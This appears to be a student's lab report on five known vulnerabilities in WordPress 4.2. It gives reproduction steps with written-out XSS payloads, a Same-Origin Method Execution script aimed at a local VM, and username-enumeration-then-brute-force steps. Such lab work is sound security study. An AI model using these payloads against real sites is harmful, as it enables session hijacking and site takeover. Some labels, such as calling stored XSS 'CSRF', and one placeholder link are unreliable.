# Project 7 - WordPress Pentesting

Time spent: **8** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) Authenticated Shortcode Tags XSS

- [x] Summary:
  - Vulnerability types: XSS
  - Tested in version: 4.2
  - Fixed in version: 4.7.2
- [x] GIF Walkthrough:
  ![](XSS.gif)
- [x] Steps to recreate:
  1. Login as admin, write in the comment section:
  ```html
  <a href = "XSS" onmouseover=alert(1) rel="nofollow">CLICK ME!</a>
    ```
  2. Hover over your mouse to the "CLICK ME!" link.
- [x] Affected source code:
  - [Link 1](https://github.com/WordPress/WordPress/commit/f72b21af23da6b6d54208e5c1d65ececdaa109c8)

2. (Required) Persisten CSRF

- [x] Summary:
  - Vulnerability types: CSRF
  - Tested in version: 4.2
  - Fixed in version: 4.7.2
- [x] GIF Walkthrough:
  ![](CSRF.gif)
- [x] Steps to recreate:
  1. On admin, in the comment section of the post, comment:
  ``` html
  <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAAAAAAAAAAA...[64 KB]..AAA'></a>
  ```
  2. Make sure that the A character length provided is at least 64kb.
- [x] Affected source code:
  - [Link 1](https://www.exploit-db.com/exploits/36844/)

3. (Required) User Enumeration

- [x] Summary:
  - Vulnerability types: User Enumeration
  - Tested in version: 4.2
  - Fixed in version: 4.4
- [x] GIF Walkthrough:
  ![](User_Enumeration.gif)
- [x] Steps to recreate:
  1. Go to the login page of WordPress.
  2. Start by typing in any username and password combinations.
  3. In version 4.2 of WordPress, if you enter in a correct username i.e admin, it will display a message saying
     the username is valid.
  4. Now, knowing the username, you can brute froce the password until you get the correct password.
- [x] Affected source code:
  - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)

4. (Optional) Pupload Same-Origin Method Execution attack

- [x] Summary:
  - Vulnerability types: SOME
  - Tested in version: 4.2
  - Fixed in version: 4.2.8
- [x] GIF Walkthrough:
  ![](SOME.gif)
- [x] Steps to recreate:
  1. In the "leave a reply" section, inside the comment box, type in:
  ```html
	<button onclick="fire()">Click</button>
	<script>
		function fire() { 
			open('javascript:setTimeout("location=\'http://wpdistillery.vm/wp-includes/js/plupload/plupload.flash.swf?target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'", 2000)');
  			setTimeout('location="http://wpdistillery.vm/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
		}
	</script>
  ```

  2. Click on the "Click" Button on the newly reply post that appeared.
- [x] Affected source code:
  - [Link 1](https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e)

5. (Optional) Audio Playlist XSS
- [x] Summary:
  - Vulnerability types: XSS
  - Tested in version: 4.2
  - Fixed in version: 4.7.3
- [x] GIF Walkthrough:
  ![](XSS2.gif)
- [x] Steps to recreate:
  1. Download the audio file from this link - [audio](https://www.securify.nl/advisory/SFY20160742/xss.mp3)
  2. Upload the audio file into the media library
  3. Create a page with audio file as a playlist
- [x] Affected source code:
  - [Link 1](https://core.trac.wordpress.org/changeset/33359)

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

One of the challenge I encounter was trying to get some of the exploits to work as intended.

## License

    Copyright [2018] [Gerry Xu]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
